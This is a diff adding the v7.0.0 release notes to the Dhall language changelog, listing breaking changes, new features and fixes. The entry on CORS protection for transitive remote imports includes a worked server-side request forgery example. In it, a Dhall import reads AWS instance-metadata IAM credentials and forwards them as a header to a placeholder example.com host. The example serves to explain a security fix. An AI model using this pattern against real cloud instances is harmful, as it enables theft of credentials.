@@ -5,6 +5,217 @@ file.
 
 For more info about our versioning policy, see [versioning.md](standard/versioning.md).
 
+## `v7.0.0`
+
+Breaking changes:
+
+*   [Protect transitive remote imports with CORS check](https://github.com/dhall-lang/dhall-lang/pull/411)
+
+    This change protects against 
+    [server-side request forgery](https://www.owasp.org/index.php/Server_Side_Request_Forgery)
+    by preventing remote imports from importing transitive remote imports 
+    that do not explicitly opt in via CORS.
+
+    For example, a simple way to exploit an AWS EC2 instance before this change
+    is to ask the instance to interpret `https://example.com/malicious`, where:
+
+    * `https://example.com/malicious` imports `https://example.com/recordsHeaders using https://example.com/stealCredentials`
+    * `https://example.com/stealCredentials` contains
+
+      ```haskell
+      [ { header = "Credentials"
+        , value = http://169.254.169.254/latest/meta-data/iam/security-credentials/role as Text
+        }
+      ]
+      ```
+
+    This is a breaking change because now the import of `http://169.254.169.254`
+    would be rejected, as the response would not include an `Access-Control-Allow-Origin` 
+    header permitting itself to be transitively imported.
+
+    Similarly, this change protects against an external internet import from
+    triggering an interpreter request against a potentially sensitive intranet
+    endpoint unless that intranet endpoint had enabled CORS whitelisting that
+    external domain.
+
+*   [Remove support for fragment identifiers](https://github.com/dhall-lang/dhall-lang/pull/406)
+
+    Fragment identifiers are not useful for remote imports since:
+
+    * They don't affect import resolution because:
+        * They are not used to resolve the host
+        * They are not transmitted to the host as part of the path to fetch
+        * More generally, fragments are required by
+          [RFC 3986](https://tools.ietf.org/html/rfc3986#section-3.5) to be
+          interpreted client-side (if at all)
+    * They don't identify any "sub-section" of a Dhall expression to fetch
+    
+    Therefore, we remove support for them in the grammar and the binary encoding.
+
+    This is a breaking change to the binary encoding, although this does not
+    affect semantic integrity checks because they are fully resolved and
+    therefore don't include imports.
+
+*   [Unescape unquoted URI path components](https://github.com/dhall-lang/dhall-lang/pull/489)
+
+    With this change all unquoted URI paths will be unescaped on parsing, and
+    all URI components will be escaped before importing.
+    
+    This changes the binary encoding, e.g. the following expressions used to encode
+    to the same bytes, but now don't:
+    * `https://example.com/a%20b/c`
+    * `https://example.com/"a%20b"/c`
+
+*   [Simplify text concatenation normalization](https://github.com/dhall-lang/dhall-lang/pull/497)
+
+    From now on, the "text concatenation" operator is interpreted as two 
+    interpolations together:
+
+    ```
+    "${l}${r}" ⇥ s₀
+    ─────────────────────
+    l ++ r ⇥ s₀
+    ```
+
+    This is a breaking change, as the following expression:
+    
+    ```hs
+    λ( a : Text ) → λ( b : Text ) → a ++ b
+    ```
+    
+    ..used to normalize to itself, while now it normalizes to:
+    
+    ```hs
+    λ( a : Text ) → λ( b : Text ) → "${a}${b}"
+    ```
+
+New features:
+
+*   [Add support for union alternatives without fields](https://github.com/dhall-lang/dhall-lang/pull/438)
+
+    This adds support for unions with empty alternatives that don't store any
+    values. In the simple case where the union has all empty alternatives it
+    degenerates to an enum.
+    
+    For example this is now possible:
+    
+    ```hs
+    let Role = < Wizard | Fighter | Rogue >
+
+    let show : Role → Text
+        show =
+            λ(x : Role)
+          → merge { Wizard = "Wizard", Fighter = "Fighter", Rogue = "Rogue" } x
+
+    in  show Role.Wizard
+    ```
+    
+    Note that the corresponding handlers don't need to take a function argument
+    any longer; that is, handlers for empty alternatives no longer have to bind
+    unused arguments of type `{}` and constructors for empty alternatives no 
+    longer have to take an input of `{=}`.
+
+*   [Expand character set for quoted labels](https://github.com/dhall-lang/dhall-lang/pull/408)
+
+    This expands quoted labels to permit all non-control ASCII characters except
+    backticks, so e.g. this is now allowed:
+    
+    ```hs
+    { `<>.\!@#$%^&*()*` = 42 }
+    ```
+
+*   [Allow builtin names as fields](https://github.com/dhall-lang/dhall-lang/pull/437)
+
+    Up until now it was not possible to use builtin names anywhere except when
+    invoking builtins. This caused some common idioms to be uncomfortable to use,
+    e.g. in order to use builtin names in record fields one needed to quote them:
+    
+    ```hs
+    let Prelude = https://prelude.dhall-lang.org/package.dhall
+
+    in  Prelude.`List`.map
+    ```
+    
+    This change allows using builtin names for anything but bound variables, so
+    this is now allowed:
+    
+    ```hs
+    let Prelude = https://prelude.dhall-lang.org/package.dhall
+
+    in  Prelude.List.map
+    ```
+
+*   [Fix typechecking of Sorts in records](https://github.com/dhall-lang/dhall-lang/pull/453)
+
+    This fixes a limitation of the record typechecking, for which `Sort`s were forbidden
+    in record types.
+    
+    So the following didn't use to typecheck but now do:
+    
+    * `{ a : Kind → Kind }` with type `Sort`
+    * `{ a : { b : Kind } }` with type `Sort`
+    * `{ a : { b : Kind → Kind } }` with type `Sort`
+    * `{ a = { b = Type } }` with type `{ a : { b : Kind } }`
+
+Other changes:
+
+*   New implementations
+
+    * [dhall-rust has been forked and is in progress](https://github.com/dhall-lang/dhall-lang/pull/468)
+    * [Add a new complete implementation, dhall-ruby](https://github.com/dhall-lang/dhall-lang/pull/479)
+
+*   Fixes and improvements to the grammar
+
+    * [Remove special rules for builtins in the grammar](https://github.com/dhall-lang/dhall-lang/pull/399)
+    * [Clarify how to decode variables named `_`](https://github.com/dhall-lang/dhall-lang/pull/407)
+    * [Make grammar suitable for PEGs, take 2](https://github.com/dhall-lang/dhall-lang/pull/442)
+    * [Imports have whitespace before the hash](https://github.com/dhall-lang/dhall-lang/pull/452)
+    * [Improve grammar for auto-generated parsers](https://github.com/dhall-lang/dhall-lang/pull/455)
+    * [Allow `merge x y z`](https://github.com/dhall-lang/dhall-lang/pull/467)
+    * [Shuffle comment parsing rules so it's easier to patch to remove ambiguity](https://github.com/dhall-lang/dhall-lang/pull/482)
+    * [Add 'builtin' rule to specify the parsing of builtins](https://github.com/dhall-lang/dhall-lang/pull/490)
+
+*   Fixes and improvements to the semantics
+
+    * [Fix decoding of imports](https://github.com/dhall-lang/dhall-lang/pull/405)
+    * [Specify equality of expressions using the binary encoding](https://github.com/dhall-lang/dhall-lang/pull/426)
+    * [`({ a = (t: T) } ⫽ { a = (n: N) }): { a: N }`](https://github.com/dhall-lang/dhall-lang/pull/432)
+    * [Fixed typos and improved notation consistency in semantics](https://github.com/dhall-lang/dhall-lang/pull/449)
+    * [Clarify when handler needs to be a function](https://github.com/dhall-lang/dhall-lang/pull/473)
+    * [Fix minor typo](https://github.com/dhall-lang/dhall-lang/pull/477)
+    * [Languages can decide how to marshal Dhall expressions](https://github.com/dhall-lang/dhall-lang/pull/474)
+    * [Add other failures to the triggers of the `?` operator fallback](https://github.com/dhall-lang/dhall-lang/pull/481)
+    * [Separate binary encoding of variables vs built-ins](https://github.com/dhall-lang/dhall-lang/pull/488)
+    * [Simplify record typechecking rules](https://github.com/dhall-lang/dhall-lang/pull/495)
+
+*   Fixes and improvements to tests
+
+    * [Add normalization unit tests](https://github.com/dhall-lang/dhall-lang/pull/416)
+    * [Update normalization tests](https://github.com/dhall-lang/dhall-lang/pull/415)
+    * [Make normalization prelude tests import only the package they need](https://github.com/dhall-lang/dhall-lang/pull/420)
+    * [Fix encoding of `largeExpression` parser test case](https://github.com/dhall-lang/dhall-lang/pull/431)
+    * [Fix parsing test for large expression](https://github.com/dhall-lang/dhall-lang/pull/445)
+    * [Fix the encoding of a test](https://github.com/dhall-lang/dhall-lang/pull/444)
+    * [Some shuffling of parser tests](https://github.com/dhall-lang/dhall-lang/pull/443)
+    * [Typecheck vs type inference tests](https://github.com/dhall-lang/dhall-lang/pull/447)
+    * [Semantic hash tests](https://github.com/dhall-lang/dhall-lang/pull/450)
+    * [Fix normalization/unit/EmptyAlternative test](https://github.com/dhall-lang/dhall-lang/pull/458)
+    * [Improve documentation of tests/parser/failure/boundBuiltins.dhall](https://github.com/dhall-lang/dhall-lang/pull/459)
+    * [Remove duplicate test](https://github.com/dhall-lang/dhall-lang/pull/460)
+    * [Update largeExpression test to new Union syntax](https://github.com/dhall-lang/dhall-lang/pull/471)
+    * [Test merging sort-level record types](https://github.com/dhall-lang/dhall-lang/pull/486)
+    
+* Fixes and improvements to infrastructure and docs
+
+    * [Add `discourse.dhall-lang.org` configuration](https://github.com/dhall-lang/dhall-lang/pull/417)
+    * [Clarify language changes approval in `CONTRIBUTING.md`](https://github.com/dhall-lang/dhall-lang/pull/427)
+    * [Make self-caching Prelude](https://github.com/dhall-lang/dhall-lang/pull/424)
+    * [Update `{prelude.,}.dhall-lang.org`](https://github.com/dhall-lang/dhall-lang/pull/429)
+    * [Fix TOC](https://github.com/dhall-lang/dhall-lang/pull/485)
+    * [Update websites](https://github.com/dhall-lang/dhall-lang/pull/491)
+    * [Update hashes for Prelude functions that started using empty alternatives](https://github.com/dhall-lang/dhall-lang/pull/480)
+
+
 ## `v6.0.0`
 
 Breaking changes:
